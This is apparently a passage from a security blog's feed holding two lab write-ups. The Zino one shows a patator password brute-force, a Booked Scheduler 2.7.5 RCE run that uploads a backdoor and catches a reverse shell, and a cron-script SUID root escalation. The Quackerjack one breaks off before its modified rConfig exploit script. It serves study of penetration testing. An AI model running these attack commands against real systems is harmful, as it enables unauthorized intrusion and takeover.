| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC44YysvRUv+02vB7LK+DbEvDnTUU2Zzaj42pbyX7gL4I5DhhWWZmK4Sr/MulEE2XPnKhXCCwTVuA12C/VuFhVdnq7WjDwfV+4a1DEuDG8P7wQAux0waAsly34mGtd7HQhQIv9h7nQWcTx8hoOrF6D71eHiZmLJ6fk01VlFN75XKJGn/T/ClJHz9UJ33zwkhqXskMO9At21LfOBE+I3IQCHuFFO6DcQWw/SsZaXQxHNzLqnI/9j1aQuvyuh6KMdT6p10D577maBz+T+Hyq/qeOgbGU0YGAoXXMU36FibkoQ+WwDRYbEHYKJccUXhzFWp980PYCIDtZNaWuo/AbgryLB
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmcORNC6GjDnH1cqJrCeytZJjGrpJyY+CgseFsH27PJmSbmVYEz0ls0w/oXR0xrG/IfvxxyH9RRX2BIsBTx2cY&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
|   256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9wfKL6wusRXGDMv5Tcf2OxMAIkhvOofRPsrSQ+aMbK
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.9.5-Debian &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3306/tcp open  mysql?      syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, NULL, RPCCheck, SSLSessionReq, WMSRequest, oracle-tns: 
|_    Host &lt;span class=&quot;s1&quot;&gt;&apos;192.168.49.156&apos;&lt;/span&gt; is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host &lt;span class=&quot;s1&quot;&gt;&apos;192.168.49.156&apos;&lt;/span&gt; is not allowed to connect to this MariaDB server
8003/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Index of /
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;We are particularly interested in the HTTP service running on port 8003.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;http-service---port-8003&quot;&gt;&lt;strong&gt;HTTP Service - Port 8003&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Lets us navigate to the website:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.175.64:8003 | html2text
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gs&quot;&gt;****** Index of / ******&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;[[ICO]] Name    Last_modified    Size Description
===========================================================================
**[[DIR]] booked/ 2019-02-05 21:02    -**
===========================================================================
&lt;/span&gt;     Apache/2.4.38 (Debian) Server at 192.168.175.64 Port 8003
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Clicked on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;booked&lt;/code&gt;, the website redirects us to a new directory - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Web/index.php&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.156.64:8003/booked/Web/index.php | html2text
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Toggle navigation     [Booked_Scheduler_-_Log_In]
&lt;span class=&quot;p&quot;&gt;    *&lt;/span&gt; Schedule
          o View_Schedule
          o View_Calendar
&lt;span class=&quot;p&quot;&gt;    *&lt;/span&gt; Help
          o Help
          o About
&lt;span class=&quot;p&quot;&gt;    *&lt;/span&gt; Log_In
[Booked Scheduler - Log In]
 [email               ]
   [&lt;span class=&quot;gs&quot;&gt;********************&lt;/span&gt;]
Log In
⁰ Remember Me
[...]
&lt;span class=&quot;gs&quot;&gt;**Booked Scheduler v2.7.5**&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The website seems it’s running &lt;strong&gt;Book Scheduler&lt;/strong&gt; version &lt;strong&gt;2.7.5&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Conducting a few investigation, we discover that our target is running a vulnerable CMS. Sucessful exploitation will lead to Remote Code Execution.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit Booked Scheduler
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                      |  Path
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Booked Scheduler 2.7.5 - Remote Command Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                      | php/webapps/46486.rb
Booked Scheduler 2.7.7 - Authenticated Directory Traversal                                                                                          | php/webapps/48428.txt
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;However, we need to note that the prerequiste for this exploit to work is a valid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; credentials.&lt;/p&gt;

&lt;h4 id=&quot;admin-credentials-attack&quot;&gt;&lt;strong&gt;Admin Credentials Attack&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;To mount a dictionary attack against &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user, we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patator&lt;/code&gt;, the username is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; and the password dictionary is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;best1050.txt&lt;/code&gt; from seclists.&lt;/p&gt;

&lt;p&gt;Our command is as follow:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;patator http_fuzz &lt;span class=&quot;nv&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://192.168.156.64:8003/booked/Web/index.php &lt;span class=&quot;nv&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;POST &lt;span class=&quot;nv&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;email=admin&amp;amp;password=FILE0&amp;amp;captcha=&amp;amp;login=submit&amp;amp;resume=&amp;amp;language=en_us&apos;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/Common-Credentials/best1050.txt &lt;span class=&quot;nv&quot;&gt;follow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; ignore:fgrep&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;could not match&apos;&lt;/span&gt;

02:54:48 patator    INFO - Starting Patator 0.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/lanjelot/patator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with python-3.9.2 at 2021-08-15 02:54 EDT
02:54:48 patator    INFO -                                                                              
02:54:48 patator    INFO - code size:clen       &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; | candidate                          |   num | mesg
02:54:48 patator    INFO - &lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------&lt;/span&gt;
02:54:53 patator    INFO - 200  13017:-1       1.005 | adminadmin                         |   118 | HTTP/1.1 200 OK
02:55:23 patator    INFO - Hits/Done/Skip/Fail/Size: 1/1049/0/0/1049, Avg: 29 r/s, Time: 0h 0m 35s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a few second, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patator&lt;/code&gt; yielded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adminadmin&lt;/code&gt; as our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; password.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;booked-scheduler-file-upload&quot;&gt;&lt;strong&gt;Booked Scheduler File Upload&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Since we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; credentials, we can use any public exploit to obtain reverse shell or via &lt;strong&gt;Metasploit&lt;/strong&gt;, but since Metasploit is really &lt;strong&gt;unstable&lt;/strong&gt;, we can also choose to manually exploit it.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PoC can be found &lt;a href=&quot;https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF&quot;&gt;here.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(The below exploit script I used can be found &lt;a href=&quot;https://github.com/jayngng/bookedScheduler_v2.7.5_RCE&quot;&gt;here.&lt;/a&gt;)&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;On our terminal, execute:
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 booked_scheduler.py &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://192.168.156.64:8003/booked/Web &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; adminadmin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 21 &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 192.168.49.156
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Checking host: http://192.168.156.64:8003/booked/Web
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Checking version Booked Scheduler v2.7.5: VULNERABLE &lt;span class=&quot;o&quot;&gt;!!!&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Checking credentials: admin:adminadmin
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Successfully logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Grabing token: &lt;span class=&quot;nv&quot;&gt;YjEzYzQ4NzIxMWZmMTU2MTU5N2NlMGM4NmI4MGJlMTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading backdoor shell...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying to &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;to :: on port 21: Done
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Triggering the shell ... 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;connections on :::21: Got connection from ::ffff:192.168.156.64 on port 58506
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Switching to interactive mode
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;561&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@zino:/var/www/html/booked/Web&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
www-data@zino:/var/www/html/booked&lt;span class=&quot;nv&quot;&gt;$ $ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Our listener caught the reverse shell at port 21 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;crontab&quot;&gt;&lt;strong&gt;Crontab&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Local enumeration divulges an interesting crontab service.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; www-data@zino:/home/peter&lt;span class=&quot;nv&quot;&gt;$ $ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/3 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    python /var/www/html/booked/cleanup.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/booked/cleanup.py&lt;/code&gt; file is executed steadily every 3 minutes as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;. More importantly, the file is also modificable by everyone.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@zino:/home/peter&lt;span class=&quot;nv&quot;&gt;$ $ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /var/www/html/booked/cleanup.py
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /var/www/html/booked/cleanup.py
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt; 1 www-data www-data 164 Apr 28  2020 /var/www/html/booked/cleanup.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, we can inject an arbitrary command requesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; to set a SUID sticky bit to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; executable.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@zino:/var/www/html/booked&lt;span class=&quot;nv&quot;&gt;$ $ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;os.system(&apos;chmod +s /bin/bash&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/www/html/booked/cleanup.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If eveything works properly, after three minutes, we should be able to execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; privilege …&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@zino:/var/www/html/booked&lt;span class=&quot;nv&quot;&gt;$ $ &lt;/span&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
/bin/bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!.&lt;/p&gt;</content><author><name></name></author><category term="pg" /><category term="zino" /><category term="linux" /><summary type="html">Summary Of Result We exploit the vulnerable Booked Scheduler CMS to obtain the initial access. We then escalate our privilege through a crontab service that will execute a python file of our control.</summary></entry><entry><title type="html">Quackerjack - OSPG</title><link href="https://jayngng.github.io/blog/quackerjack-ospg/" rel="alternate" type="text/html" title="Quackerjack - OSPG" /><published>2021-08-15T08:49:32+10:00</published><updated>2021-08-15T08:49:32+10:00</updated><id>https://jayngng.github.io/blog/quackerjack---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/quackerjack-ospg/">&lt;h1 id=&quot;summary-of-result&quot;&gt;&lt;strong&gt;Summary Of Result&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We gain initial foothold by exploiting the vulnerable version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rConfig - Configuration Management&lt;/code&gt; application. We will then escalate our privilege via a misconfigred SUID binary.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;attack-narrative&quot;&gt;&lt;strong&gt;Attack Narrative&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;The general attack is wrapped up into three main phases:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Enumeration&lt;/li&gt;
  &lt;li&gt;Exploitation&lt;/li&gt;
  &lt;li&gt;Privilege Escalation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We will begin with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nmap -sV -p- -A -Pn $IP -oA nmap/services&lt;/span&gt;

21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.2
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.6 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.0.2k-fips PHP/5.4.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
111/tcp  open  rpcbind     syn-ack ttl 63 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
111/tcp   rpcbind
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: SAMBA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.10.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: SAMBA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3306/tcp open  mysql       syn-ack ttl 63 MariaDB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
8081/tcp open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.6 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.0.2k-fips PHP/5.4.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;There are several services running on the system, we specifically target &lt;strong&gt;HTTPS&lt;/strong&gt; on port 8081.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web-application-port-8081&quot;&gt;&lt;strong&gt;Web Application Port 8081&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Navigate to the application, we can directly spot couple of interesting information:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Running &lt;strong&gt;rConfig - Configuration Management&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Version 3.9.4 → Vulnerable?&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;After a few researches, we discover that the running &lt;strong&gt;rConfig&lt;/strong&gt; is actually vulnerable to Remote Code Execution.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# searchsploit rConfig 3.9.4&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                                                   |  Path
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
rConfig 3.9.4 - &lt;span class=&quot;s1&quot;&gt;&apos;search.crud.php&apos;&lt;/span&gt; Remote Command Injection                                                                                                                       | php/webapps/48241.py
rConfig 3.9.4 - &lt;span class=&quot;s1&quot;&gt;&apos;searchField&apos;&lt;/span&gt; Unauthenticated Root Remote Code Execution                                                                                                         | php/webapps/48261.py
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;As stated in official document, the default credentials are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;. However, it might not in this case.&lt;/p&gt;

&lt;p&gt;According to the results from the previous &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; command, we can potentially execute either script and end up with a reverse shell.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The second script (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchField&lt;/code&gt;) utilizes &lt;strong&gt;SQL Injection&lt;/strong&gt; to create an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user → login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; → abuse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ajaxArchiveFiles.php&lt;/code&gt; file to execute malicious payload.&lt;/li&gt;
  &lt;li&gt;The first script (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;search.crud.php&lt;/code&gt;) exploits the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;search.crud.php&lt;/code&gt; file and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodeId&lt;/code&gt; parameter to obtain a reverse shell.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Unfortunately, this is not the case because the second script fails to return a revese shell while we need a valid admin credential to successfully execute the first script.&lt;/p&gt;

&lt;p&gt;We can try to brute force admin credentials with the username is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;. However, we can also choose to combine two scripts and make our exploit work. As mentioned, the second script will create an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user by exploiting SQL Injection vulnerability, but the script need to be modified. Otherwise, it won’t work.&lt;/p&gt;

&lt;p&gt;The following is the modified script, which can be used to create a valid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user:&lt;/p&gt;
